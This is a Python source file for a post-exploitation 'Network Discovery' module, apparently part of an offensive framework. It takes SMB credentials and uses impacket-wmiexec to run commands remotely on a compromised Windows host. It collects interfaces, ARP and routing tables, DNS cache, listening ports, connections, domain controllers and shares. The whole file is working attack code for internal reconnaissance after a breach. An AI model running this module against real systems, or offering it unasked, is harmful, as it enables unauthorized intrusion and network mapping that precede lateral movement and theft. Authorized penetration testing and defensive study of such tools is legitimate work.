"""Post-Exploitation — Network Discovery.

Enumerates the internal network from a compromised host: ARP table,
routing table, DNS cache, network interfaces, listening ports,
and active connections.
"""

import subprocess
import shutil
import re

NAME = "Network Discovery"
DESCRIPTION = "Enumerate internal network from compromised host"


def run(options=None, target=None, mode="CHECK", **kwargs):
    if options is None:
        options = {}
    rhosts = target or options.get("RHOSTS", "")
    timeout = int(options.get("TIMEOUT", 15))
    smb_user = options.get("SMB_USER", "")
    smb_pass = options.get("SMB_PASS", "")
    smb_domain = options.get("SMB_DOMAIN", "")

    result = {
        "success": False,
        "technique": NAME,
        "target": rhosts,
        "mode": mode,
        "data": {},
        "error": None,
    }

    if not rhosts or not smb_user or not smb_pass:
        result["error"] = "RHOSTS, SMB_USER, SMB_PASS required"
        return result

    cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
    if not cmd:
        result["error"] = "impacket-wmiexec not found"
        return result

    auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"

    if mode == "CHECK":
        result["success"] = True
        result["data"]["status"] = "Network discovery module ready"
        return result

    elif mode == "EXPLOIT":
        try:
            network = {
                "interfaces": [],
                "arp_table": [],
                "routing_table": [],
                "dns_cache": [],
                "listening_ports": [],
                "active_connections": [],
                "domain_controllers": [],
                "shares": [],
            }

            # Network interfaces
            print(f"  [*] Enumerating network interfaces...")
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q",
                 "ipconfig /all"],
                capture_output=True, text=True, timeout=timeout,
            )
            interfaces = []
            for line in p.stdout.splitlines():
                if any(x in line.lower() for x in ["ipv4", "subnet", "gateway", "dns"]):
                    interfaces.append(line.strip())
            network["interfaces"] = interfaces

            # ARP table
            print(f"  [*] Reading ARP table...")
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", "arp -a"],
                capture_output=True, text=True, timeout=timeout,
            )
            arp_entries = []
            for line in p.stdout.splitlines():
                if re.match(r"\s*\d+\.\d+\.\d+\.\d+", line):
                    arp_entries.append(line.strip())
            network["arp_table"] = arp_entries

            # Routing table
            print(f"  [*] Reading routing table...")
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", "route print"],
                capture_output=True, text=True, timeout=timeout,
            )
            routes = []
            for line in p.stdout.splitlines():
                if re.match(r"\s*\d+\.\d+\.\d+\.\d+", line):
                    routes.append(line.strip())
            network["routing_table"] = routes

            # DNS cache
            print(f"  [*] Reading DNS cache...")
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", "ipconfig /displaydns | findstr RecordName"],
                capture_output=True, text=True, timeout=timeout,
            )
            dns_entries = [line.strip() for line in p.stdout.splitlines() if "RecordName" in line]
            network["dns_cache"] = dns_entries

            # Listening ports
            print(f"  [*] Enumerating listening ports...")
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", "netstat -ano | findstr LISTENING"],
                capture_output=True, text=True, timeout=timeout,
            )
            listening = [line.strip() for line in p.stdout.splitlines()
                        if "LISTENING" in line]
            network["listening_ports"] = listening

            # Active connections
            print(f"  [*] Reading active connections...")
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", "netstat -ano | findstr ESTABLISHED"],
                capture_output=True, text=True, timeout=timeout,
            )
            established = [line.strip() for line in p.stdout.splitlines()
                          if "ESTABLISHED" in line]
            network["active_connections"] = established

            # Domain controller discovery
            print(f"  [*] Finding domain controllers...")
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", "nltest /dclist:"],
                capture_output=True, text=True, timeout=timeout,
            )
            dcs = re.findall(r"\\\\(\S+)", p.stdout)
            network["domain_controllers"] = dcs

            # Network shares
            print(f"  [*] Enumerating network shares...")
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", "net share"],
                capture_output=True, text=True, timeout=timeout,
            )
            shares = []
            for line in p.stdout.splitlines():
                if "\\" in line or "Share" in line:
                    shares.append(line.strip())
            network["shares"] = shares

            result["success"] = True
            result["data"] = network
            result["data"]["status"] = (
                f"Network mapped: {len(network['interfaces'])} interfaces, "
                f"{len(network['arp_table'])} ARP entries, "
                f"{len(network['listening_ports'])} listening ports, "
                f"{len(network['active_connections'])} connections, "
                f"{len(network['domain_controllers'])} DCs"
            )

            # Summary
            print(f"\n  [+] Network Summary:")
            print(f"      Interfaces: {len(network['interfaces'])}")
            print(f"      ARP entries: {len(network['arp_table'])}")
            print(f"      Listening ports: {len(network['listening_ports'])}")
            print(f"      Active connections: {len(network['active_connections'])}")
            print(f"      Domain controllers: {len(network['domain_controllers'])}")
            print(f"      DNS cache entries: {len(network['dns_cache'])}")

        except Exception as e:
            result["error"] = str(e)

    return result
